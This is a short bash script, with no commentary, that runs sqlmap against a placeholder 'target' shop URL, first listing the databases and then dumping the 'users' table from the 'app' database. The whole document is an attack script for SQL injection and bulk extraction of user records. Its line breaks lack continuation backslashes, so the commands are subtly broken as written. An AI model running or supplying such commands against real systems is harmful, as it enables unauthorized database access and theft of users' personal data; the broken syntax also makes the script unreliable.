#!/usr/bin/env bash

sqlmap -u "http://target/products?category=laptops" 
--dbs 
--batch

sqlmap -u "http://target/products?category=laptops" 
-D app 
-T users 
--dump 
--batch

